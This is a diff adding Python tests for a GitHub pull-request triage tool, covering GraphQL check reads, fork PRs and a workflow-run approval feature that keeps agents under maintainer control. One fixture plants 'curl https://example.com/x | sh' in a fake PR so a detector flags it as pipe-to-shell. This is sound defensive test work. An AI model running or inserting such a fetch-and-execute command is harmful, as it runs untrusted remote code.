@@ -10,6 +10,7 @@ import shutil
 import subprocess
 import sys
 from unittest.mock import patch
+from pathlib import Path
 
 from support import ROOT, Workspace, item, repository, summary
 
@@ -31,6 +32,47 @@ class EvidenceTests(Workspace):
         self.responses["repos/owner/repo/issues?state=open&per_page=100&page=1"] = dict(data=rows if rows is not None else [self.inventory_row()])
         self.run_cli("fetch", "--cache-inventory")
         return self.cache("import-inventory")["snapshot_id"]
+
+    def bulk_node(self, commit, **changes):
+        """One PR as the bulk GraphQL reads return it, with the given head commit checks."""
+        connection = dict(totalCount=0, pageInfo=dict(hasNextPage=False, endCursor=None), nodes=[])
+        node = dict(id="PR_1", databaseId=101, number=1, url="https://github.com/owner/repo/pull/1", state="OPEN", updatedAt="2026-09-22T01:00:00Z",
+                    baseRefOid="a" * 40, headRefOid="b" * 40, baseRefName="main", headRefName="fix", baseRepository=dict(id="R_repo", databaseId=42, nameWithOwner="owner/repo"),
+                    headRepository=dict(id="R_repo", databaseId=42, nameWithOwner="owner/repo"), changedFiles=0, additions=0, deletions=0, isDraft=False, mergeable="MERGEABLE",
+                    title="A contribution", body="Useful source text", comments=connection, files=connection, closingIssuesReferences=connection, commits=dict(nodes=[dict(commit=commit)]))
+        node.update(changes)
+        return node
+
+    def bulk_batch(self, node):
+        """Run acquire_batch for PR 1 against a fake GraphQL reader. Git is stubbed to fail, so code evidence stays partial and nothing is fetched."""
+        (self.mock / "git").write_text("#!/bin/sh\nexit 1\n")
+        (self.mock / "git").chmod(0o755)
+        code = '''import json, sys
+from _bulk import acquire_batch
+from _cache import EvidenceCache
+from _evidence import repository
+
+class Reader:
+    requests, budget, stopped = 0, 10, None
+
+    def _request(self, path, graphql_query=None, graphql_variables=None):
+        self.requests += 1
+        node = json.loads(sys.argv[1])
+        fork = (node.get("headRepository") or {}).get("nameWithOwner") not in (None, "owner/repo")
+        if "forkCommit" in graphql_query and (graphql_variables["f0"], graphql_variables["h0"]) != (fork, node["headRefOid"]):
+            sys.exit("the final read asked for the wrong fork head commit")
+        return json.dumps(dict(data=dict(repository=dict(id="R_repo", databaseId=42, nameWithOwner="owner/repo", p0=node), rateLimit=dict(remaining=100, resetAt=None)))), None
+
+    def _json(self, body):
+        return json.loads(body)
+
+[(_, manifest)] = acquire_batch(EvidenceCache(repository("owner/repo", host="github.com")), Reader(), "pr", [dict(kind="pr", number=1)])
+print(json.dumps(manifest))
+'''
+        env = dict(self.env, PYTHONPATH=str(self.root / "bin"))
+        result = subprocess.run([sys.executable, "-c", code, json.dumps(node)], cwd=self.root, env=env, capture_output=True, text=True)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        return json.loads(result.stdout)
 
     def test_failed_job_logs_are_bounded_pinned_and_read_offline(self):
         sha = "b" * 40
@@ -140,6 +182,19 @@ class EvidenceTests(Workspace):
         reused_pointer.write_bytes(reused_pointer_bytes)
         self.run_cli("pr-checks", *refreshed_args, "--acquire-failure-logs", ok=False)
         self.run_cli("pr-checks", "--expected-repo", "owner/repo", "--number", "1", "--acquire-failure-logs", ok=False)
+
+        # A dataset refresh then publishes checks read through GraphQL. The unchanged finished run is found through the latest-capture pointer, and its log is reused without a request.
+        graphql_run = dict(databaseId=20, name="build", status="COMPLETED", conclusion="FAILURE", startedAt="2026-09-22T02:00:00Z", completedAt="2026-09-22T02:01:00Z", detailsUrl=None, url=None)
+        graphql_suite = dict(databaseId=10, status="COMPLETED", conclusion="FAILURE", createdAt="2026-09-22T02:00:00Z", updatedAt="2026-09-22T02:01:00Z", app=dict(databaseId=11, slug="github-actions", name="GitHub Actions"),
+                             repository=dict(id="R_repo", databaseId=42, nameWithOwner="owner/repo"), workflowRun=dict(databaseId=30, event="pull_request", workflow=dict(name="CI")),
+                             checkRuns=dict(totalCount=1, pageInfo=dict(hasNextPage=False), nodes=[graphql_run]))
+        bulk = self.bulk_batch(self.bulk_node(dict(oid=sha, checkSuites=dict(totalCount=1, pageInfo=dict(hasNextPage=False), nodes=[graphql_suite]), status=None)))
+        before_bulk = len(self.calls())
+        after_bulk = self.json_cli("pr-checks", "--expected-repo", "owner/repo", "--number", "1", "--mode", "cache-preferred", "--acquire-failure-logs", "--include-failure-logs")
+        self.assertEqual((after_bulk["snapshot_id"], after_bulk["requests"], after_bulk["failure_log_acquisition"]["reused"]), (bulk["snapshot_id"], 0, 1))
+        bulk_log = next(row for row in after_bulk["rows"] if row["source"] == "check-run")["failure_log"]
+        self.assertEqual((bulk_log["state"], bulk_log["log_object"], bulk_log["capture_snapshot_id"]), ("retained", combined_ref, snapshot))
+        self.assertEqual(len(self.calls()), before_bulk)
 
         # A changed retained source requires a new capture instead of silently reusing the earlier bytes.
         check["name"] = "renamed build"
@@ -485,6 +540,18 @@ class EvidenceTests(Workspace):
         self.assertEqual(suite_only["observed_result"], "pending")
         self.assertTrue(any(value["source"] == "check-suite" for value in suite_only["rows"]))
         self.assertFalse(any("completed_at is missing" in value["problems"] for value in suite_only["rows"] if value["source"] == "check-suite"))
+
+        # A suite waiting for approval has no check runs, so the waiting run listing names it; the run of another suite is not retained.
+        sources([suite(conclusion="action_required")], [], [])
+        self.responses[f"repos/owner/repo/actions/runs?head_sha={sha}&status=action_required&per_page=100&page=1"] = dict(data=dict(total_count=2, workflow_runs=[
+            dict(id=70, name="Fork checks", check_suite_id=10, head_sha=sha, repository=repository()), dict(id=71, name="Elsewhere", check_suite_id=99, head_sha=sha, repository=repository())]))
+        awaiting = self.json_cli("pr-checks", *args, "--mode", "refresh")
+        self.assertEqual(awaiting["observed_result"], "pending")
+        self.assertEqual(awaiting["result_counts"], dict(passed=0, failed=0, pending=1, unknown=0))
+        self.assertEqual(awaiting["rows"][0]["name"], "Fork checks")
+        self.assertTrue(any("action required" in problem for problem in awaiting["rows"][0]["problems"]))
+        self.assertFalse(any("job" in problem for problem in awaiting["rows"][0]["problems"]))
+        self.assertFalse(awaiting["rows"][0]["log_capture_supported"])
 
         other_app = dict(id=12, name="Another CI")
         sources([suite(), suite(12, app=other_app)], [run(), run(22, app=other_app, check_suite=dict(id=12))], [])
@@ -1079,6 +1146,34 @@ except ReadFailure as error:
         self.assertEqual(json.loads(hard.stdout)["requests"], 1)
         self.assertIn("repository access", json.loads(hard.stdout)["error"])
 
+    def test_bulk_corpus_snapshot_reads_checks_and_keeps_earlier_components(self):
+        sha = "b" * 40
+        reviews = self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "pr-context", "--mode", "refresh")
+
+        # A fork PR whose run waits for approval: GitHub has created its suite but no check run yet. The fork's own commit is read too, as the REST collector reads both repositories.
+        suite = dict(databaseId=10, status="COMPLETED", conclusion="ACTION_REQUIRED", createdAt="2026-09-22T02:00:00Z", updatedAt="2026-09-22T02:00:00Z",
+                     app=dict(databaseId=11, slug="github-actions", name="GitHub Actions"), repository=dict(id="R_repo", databaseId=42, nameWithOwner="owner/repo"),
+                     workflowRun=dict(databaseId=30, event="pull_request", workflow=dict(name="Fork checks")), checkRuns=dict(totalCount=0, pageInfo=dict(hasNextPage=False), nodes=[]))
+        status = dict(id="SC_1", context="ci/lint", state="SUCCESS", targetUrl="https://ci.example.com/1", createdAt="2026-09-22T02:00:00Z")
+        commit = dict(oid=sha, checkSuites=dict(totalCount=1, pageInfo=dict(hasNextPage=False), nodes=[suite]), status=dict(contexts=[status]))
+        node = self.bulk_node(commit, headRepository=dict(id="R_fork", databaseId=43, nameWithOwner="fork/repo"),
+                              forkCommit=dict(object=dict(oid=sha, checkSuites=dict(totalCount=0, pageInfo=dict(hasNextPage=False), nodes=[]), status=None)))
+        manifest = self.bulk_batch(node)
+        self.assertNotEqual(manifest["snapshot_id"], reviews["snapshot_id"])
+        self.assertTrue({"checks", "reviews"} <= set(manifest["requested_components"]))
+        self.assertEqual(manifest["items"][0]["components"]["checks"]["source"]["transport"], "graphql")
+        before = len(self.calls())
+        offline = self.json_cli("pr-checks", "--expected-repo", "owner/repo", "--number", "1", "--mode", "offline")
+        self.assertEqual(len(self.calls()), before)
+        self.assertEqual((offline["snapshot_id"], offline["coverage"], offline["result_counts"]["pending"], offline["result_counts"]["passed"]), (manifest["snapshot_id"], "complete", 1, 1))
+        waiting = next(row for row in offline["rows"] if row["source"] == "check-suite")
+        self.assertEqual((waiting["name"], waiting["conclusion"], waiting["result"]), ("Fork checks", "action_required", "pending"))
+
+        # Without the fork's own commit, coverage is partial rather than silently complete.
+        manifest = self.bulk_batch(dict(node, forkCommit=None))
+        self.assertEqual(manifest["items"][0]["components"]["checks"]["status"], "partial")
+        self.assertIn("fork/repo", manifest["items"][0]["components"]["checks"]["error"])
+
     def test_partial_latest_observation_remains_visible(self):
         first = self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "discussion")
         self.responses["repos/owner/repo/pulls/1"] = dict(data=summary(head=dict(sha="c" * 40, repo=repository())))
@@ -1261,3 +1356,182 @@ print(json.dumps(result))
         before = len(self.calls())
         self.run_cli("cache", "read", "--kind", "pr", "--number", "1", "--profile", "discussion", ok=False)
         self.assertEqual(len(self.calls()), before)
+
+    def test_workflow_runs_awaiting_approval_are_flagged_offline_from_pinned_evidence(self):
+        # The base commit's workflows are read from the install's own checkout, so the install moves into a real repository.
+        checkout = Path(self.root.parent) / (self.root.name + "-checkout")
+        self.addCleanup(shutil.rmtree, checkout, True)
+        (checkout / ".github/workflows").mkdir(parents=True)
+        (checkout / ".github/workflows/ci.yml").write_text("on: pull_request\njobs:\n  test:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n    steps:\n      - run: ./scripts/test.sh\n")
+        git = ("git", "-c", "user.name=Test", "-c", "user.email=test@example.com", "-C", str(checkout))
+        subprocess.run([*git, "init", "-q"], check=True)
+        subprocess.run([*git, "add", "."], check=True)
+        subprocess.run([*git, "commit", "-q", "-m", "base"], check=True)
+        base = subprocess.run([*git, "rev-parse", "HEAD"], check=True, capture_output=True, text=True).stdout.strip()
+        shutil.move(self.root, checkout / "triage-o-mator")
+        self.root.mkdir()
+        self.root, self.mock = checkout / "triage-o-mator", checkout / "triage-o-mator/mock"
+        self.env.update(PATH=str(self.mock) + os.pathsep + os.environ["PATH"], FAKE_GH_DIR=str(self.mock))
+
+        head = "b" * 40
+        pull = self.responses["repos/owner/repo/pulls/1"]["data"]
+        pull["base"]["sha"] = base
+        runs = f"repos/owner/repo/actions/runs?status=action_required&head_sha={head}&per_page=100&page=1"
+        run = dict(id=7, name="CI", path=".github/workflows/ci.yml", event="pull_request", status="completed", conclusion="action_required", head_sha=head,
+                   head_repository=dict(full_name="owner/repo"), repository=repository(), run_attempt=1, html_url="https://github.com/owner/repo/actions/runs/7")
+        self.responses[runs] = dict(data=dict(total_count=1, workflow_runs=[run]))
+
+        def change(files):
+            blocks, rows = [], []
+            for name, patch_text in files:
+                blocks.append(f"diff --git a/{name} b/{name}\nindex 1111111..2222222 100644\n--- a/{name}\n+++ b/{name}\n{patch_text}")
+                rows.append(dict(filename=name, status="modified", additions=patch_text.count("\n+"), deletions=patch_text.count("\n-"), changes=0, patch=patch_text))
+            pull.update(changed_files=len(rows), additions=sum(row["additions"] for row in rows), deletions=sum(row["deletions"] for row in rows))
+            self.responses["repos/owner/repo/pulls/1#diff"] = dict(text="\n".join(blocks))
+            self.responses["repos/owner/repo/pulls/1/files?per_page=100&page=1"] = dict(data=rows)
+            return self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "pr-code", "--mode", "refresh")["snapshot_id"]
+
+        args = ("--expected-repo", "owner/repo", "--number", "1")
+        snapshot = change([("src/app.py", "@@ -1,1 +1,1 @@\n-old\n+new")])
+        before = len(self.calls())
+        listed = self.json_cli("workflow-runs", "list", *args, "--snapshot", snapshot)
+        self.assertEqual(([value["id"] for value in listed["runs"]], listed["requests"]), ([7], 2))
+        self.assertTrue(all(call[call.index("--method") + 1] == "GET" for call in self.calls()[before:]))
+        offline = len(self.calls())
+        normal = self.json_cli("workflow-runs", "assess", *args)
+        self.assertEqual((normal["counts"], normal["pr_flags"], normal["runs"][0]["flags"]), (dict(normal=1, suspicious=0), [], []))
+        self.assertEqual(self.json_cli("workflow-runs", "assess", *args)["checksum"], normal["checksum"])
+        self.assertEqual(len(self.calls()), offline)
+        reused = self.json_cli("workflow-runs", "list", *args, "--acquire")
+        self.assertEqual((reused["snapshot_id"], reused["requests"]), (snapshot, 2))
+
+        # Approval posts only through a wrapper that answers the approve endpoint; every other request stays with the strict read-only fake.
+        shutil.move(self.mock / "gh", self.mock / "gh-read")
+        (self.mock / "gh").write_text('''#!/usr/bin/env python3
+import json, os, sys
+from pathlib import Path
+root = Path(os.environ["FAKE_GH_DIR"])
+args = sys.argv[1:]
+if "POST" in args and args[-1].endswith("/approve"):
+    with (root / "calls.jsonl").open("a") as out:
+        out.write(json.dumps(args) + "\\n")
+    status = (root / "approve-status").read_text().strip() if (root / "approve-status").exists() else "201"
+    if status == "lost":
+        sys.exit("connection reset")
+    print("HTTP/2.0 " + status)
+    print()
+    print(json.dumps(dict(message="Must have write access")) if status != "201" else "")
+    sys.exit(0 if status == "201" else 1)
+os.execv(str(root / "gh-read"), [str(root / "gh-read"), *args])
+''')
+        (self.mock / "gh").chmod(0o755)
+        self.responses["repos/owner/repo/actions/runs/7"] = dict(data=run)
+        posts = lambda: [call[-1] for call in self.calls() if "POST" in call]
+
+        # The pass is off by default and an agent never approves outside it; a person's dry run binds the runs, their state and holds.
+        self.assertIn("off", self.run_cli("workflow-runs", "pass-preview", *args, ok=False).stderr)
+        self.assertIn("only through the pass", self.run_cli("workflow-runs", "approve", *args, "--run", "7", "--by", "agent:ci", ok=False).stderr)
+        dry = self.json_cli("workflow-runs", "approve", *args, "--run", "7", "--by", "maintainer")
+        self.assertEqual((dry["plan"]["head_sha"], dry["plan"]["runs"][0]["state"], dry["plan"]["assessment_checksum"]), (head, "normal", self.json_cli("workflow-runs", "assess", *args)["checksum"]))
+        mode = self.json_cli("workflow-runs", "mode", "--expected-repo", "owner/repo")
+        self.assertEqual(self.json_cli("workflow-runs", "mode", "--expected-repo", "owner/repo", "--set", "execute", "--expected-revision", mode["revision"])["mode"], "execute")
+
+        # An agent's concern stages the run; only a person releases it, and the note stays as history.
+        self.assertIn("needs a reason", self.run_cli("workflow-runs", "hold", *args, "--run", "7", "--head", head, "--by", "agent:ci", ok=False).stderr)
+        concern = self.json_cli("workflow-runs", "hold", *args, "--run", "7", "--head", head, "--by", "agent:ci", "--reason", "The test script now reads a token")["notes"][0]
+        self.assertEqual(concern["kind"], "concern")
+        staged = self.json_cli("workflow-runs", "pass-preview", *args)["plan"]["items"][0]["runs"][0]
+        self.assertEqual((staged["mode"], staged["reasons"]), ("stage", ["agent concern from agent:ci"]))
+        self.assertEqual(self.run_cli("workflow-runs", "approve", *args, "--run", "7", "--by", "agent:ci", "--automation", ok=False).returncode, 3)
+        self.assertIn("cannot release", self.run_cli("workflow-runs", "release", *args, "--note", concern["id"], "--by", "agent:ci", ok=False).stderr)
+        self.json_cli("workflow-runs", "release", *args, "--note", concern["id"], "--by", "maintainer")
+        self.assertEqual(self.json_cli("workflow-runs", "assess", *args)["local"]["notes"][0]["released"]["by"], "maintainer")
+
+        # A normal, unheld run is approved by the pass after a live recheck of the PR and the run, with one POST.
+        preview = self.json_cli("workflow-runs", "pass-preview", *args)
+        self.assertEqual(preview["plan"]["items"][0]["runs"][0]["mode"], "execute")
+        before = len(self.calls())
+        passed = self.json_cli("workflow-runs", "pass-run", *args, "--by", "agent:ci", "--preview-sha256", preview["preview_sha256"])
+        self.assertEqual([(row["run_id"], row["status"], row["actor"]) for row in passed["results"]], [(7, "approved", "automation")])
+        self.assertEqual([call[-1] for call in self.calls()[before:]], ["repos/owner/repo/pulls/1", "repos/owner/repo/actions/runs/7", "repos/owner/repo/actions/runs/7/approve"])
+        self.assertEqual(self.json_cli("workflow-runs", "pass-preview", *args)["plan"]["items"][0]["runs"][0]["mode"], "approved")
+
+        # A permission refusal is definite; a lost reply is unknown, stops, and is never posted again for the same request.
+        self.responses[runs] = dict(data=dict(total_count=2, workflow_runs=[run, dict(run, id=9)]))
+        self.responses["repos/owner/repo/actions/runs/9"] = dict(data=dict(run, id=9))
+        self.json_cli("workflow-runs", "list", *args, "--acquire")
+        (self.mock / "approve-status").write_text("403")
+        dry = self.json_cli("workflow-runs", "approve", *args, "--run", "9", "--by", "maintainer")
+        refused = self.json_cli("workflow-runs", "approve", *args, "--run", "9", "--by", "maintainer", "--publish", "--request-id", dry["plan"]["request_id"], "--approve", dry["approval"])
+        self.assertEqual([(row["status"], row["http_status"]) for row in refused["results"]], [("refused", 403)])
+        (self.mock / "approve-status").write_text("lost")
+        dry = self.json_cli("workflow-runs", "approve", *args, "--run", "9", "--by", "maintainer")
+        self.assertEqual(dry["plan"]["runs"][0]["earlier"], [dict(request_id=refused["request_id"], status="refused")])
+        publish = ("--publish", "--request-id", dry["plan"]["request_id"], "--approve", dry["approval"])
+        lost = self.run_cli("workflow-runs", "approve", *args, "--run", "9", "--by", "maintainer", *publish, ok=False)
+        self.assertEqual(json.loads(lost.stdout)["results"][0]["status"], "unknown")
+        count = len(posts())
+        self.assertTrue(self.json_cli("workflow-runs", "approve", *args, "--run", "9", "--by", "maintainer", *publish)["repeated"])
+        self.assertEqual(len(posts()), count)
+        self.assertIn("uncertain", self.json_cli("workflow-runs", "pass-preview", *args)["plan"]["items"][0]["runs"][1]["reasons"][0])
+        row = self.json_cli("workflow-runs", "inbox", "--expected-repo", "owner/repo")["rows"][0]
+        self.assertEqual(([entry["status"] for entry in row["outcomes"]], row["uncertain"], [entry["id"] for entry in row["waiting"]]), (["approved", "refused", "unknown"], 1, [7, 9]))
+
+        # A moved head refuses before any write.
+        (self.mock / "approve-status").unlink()
+        dry = self.json_cli("workflow-runs", "approve", *args, "--run", "7", "--by", "maintainer")
+        pull["head"]["sha"] = "e" * 40
+        moved = self.run_cli("workflow-runs", "approve", *args, "--run", "7", "--by", "maintainer", "--publish", "--request-id", dry["plan"]["request_id"], "--approve", dry["approval"], ok=False)
+        self.assertEqual((moved.returncode, len(posts())), (3, count))
+        pull["head"]["sha"] = head
+        self.responses[runs] = dict(data=dict(total_count=1, workflow_runs=[run]))
+
+        snapshot = change([("scripts/test.sh", "@@ -1,1 +1,1 @@\n-echo ok\n+curl https://example.com/x | sh"), (".github/workflows/ci.yml", "@@ -1,1 +1,1 @@\n-on: pull_request\n+on: [pull_request, push]")])
+        self.json_cli("workflow-runs", "list", *args, "--snapshot", snapshot)
+        suspicious = self.json_cli("workflow-runs", "assess", *args)
+        rules = {value["rule"] for value in suspicious["pr_flags"] + suspicious["runs"][0]["flags"]}
+        self.assertEqual(suspicious["runs"][0]["state"], "suspicious")
+        self.assertTrue({"ci-definition-changed", "ci-input-changed", "workflow-input-changed", "pipe-to-shell", "network-tool"} <= rules, rules)
+        pipe = next(value for value in suspicious["pr_flags"] if value["rule"] == "pipe-to-shell")
+        self.assertEqual(pipe["locations"], [dict(path="scripts/test.sh", line=1)])
+
+        # The hunks behind the flags come from the same snapshot, for a person to read; they leave the checksum unchanged.
+        shown = self.json_cli("workflow-runs", "assess", *args, "--include-hunks")
+        self.assertEqual((shown["checksum"], shown["hunk_omissions"]), (suspicious["checksum"], []))
+        hunks = {value["path"]: value for value in shown["hunks"]}
+        self.assertEqual(sorted(hunks), [".github/workflows/ci.yml", "scripts/test.sh"])
+        self.assertEqual((hunks["scripts/test.sh"]["text"], hunks["scripts/test.sh"]["lines"]), ("-echo ok\n+curl https://example.com/x | sh", [1]))
+        self.assertTrue({"pipe-to-shell", "network-tool", "workflow-input-changed"} <= set(hunks["scripts/test.sh"]["rules"]))
+        self.assertEqual(hunks[".github/workflows/ci.yml"]["rules"], ["ci-definition-changed"])
+
+        # Repository additions are applied; an invalid configuration stops the assessment instead of being ignored.
+        snapshot = change([("src/app.py", "@@ -1,1 +1,1 @@\n-old\n+telemetry.send()")])
+        self.json_cli("workflow-runs", "list", *args, "--snapshot", snapshot)
+        (self.root / "config/workflow-approval.json").write_text(json.dumps(dict(patterns=[r"telemetry\."])))
+        configured = self.json_cli("workflow-runs", "assess", *args)
+        self.assertEqual([value["rule"] for value in configured["pr_flags"]], ["repository-pattern-1"])
+        (self.root / "config/workflow-approval.json").write_text(json.dumps(dict(patterns=["("])))
+        self.assertIn("is invalid", self.run_cli("workflow-runs", "assess", *args, ok=False).stderr)
+        (self.root / "config/workflow-approval.json").unlink()
+
+        # A moved head, a missing base commit or a self-hosted runner can never be normal.
+        pull["head"]["sha"] = "d" * 40
+        self.json_cli("workflow-runs", "list", *args, "--snapshot", snapshot)
+        self.assertIn("head-moved", {value["rule"] for value in self.json_cli("workflow-runs", "assess", *args)["pr_flags"]})
+        # Acquiring instead refreshes the reused snapshot once and lists the runs for the live head.
+        self.responses[runs.replace(head, "d" * 40)] = dict(data=dict(total_count=1, workflow_runs=[dict(run, id=8, head_sha="d" * 40)]))
+        moved = self.json_cli("workflow-runs", "list", *args, "--acquire", "--request-budget", "20")
+        self.assertEqual(([value["id"] for value in moved["runs"]], moved["snapshot_id"] == snapshot), ([8], False))
+        self.assertEqual(self.json_cli("workflow-runs", "assess", *args)["head_sha"], "d" * 40)
+        pull["head"]["sha"] = head
+        pull["base"]["sha"] = "c" * 40
+        snapshot = change([("src/app.py", "@@ -1,1 +1,1 @@\n-old\n+new")])
+        self.json_cli("workflow-runs", "list", *args, "--snapshot", snapshot)
+        unavailable = self.json_cli("workflow-runs", "assess", *args)
+        self.assertEqual([value["rule"] for value in unavailable["runs"][0]["flags"]], ["base-workflows-unavailable"])
+        (checkout / ".github/workflows/ci.yml").write_text("on: pull_request\njobs:\n  test:\n    runs-on: [self-hosted, linux]\n")
+        subprocess.run([*git, "commit", "-q", "-am", "self-hosted"], check=True)
+        pull["base"]["sha"] = subprocess.run([*git, "rev-parse", "HEAD"], check=True, capture_output=True, text=True).stdout.strip()
+        snapshot = change([("src/app.py", "@@ -1,1 +1,1 @@\n-old\n+new")])
+        self.json_cli("workflow-runs", "list", *args, "--snapshot", snapshot)
+        self.assertEqual([value["rule"] for value in self.json_cli("workflow-runs", "assess", *args)["runs"][0]["flags"]], ["non-hosted-runner"])
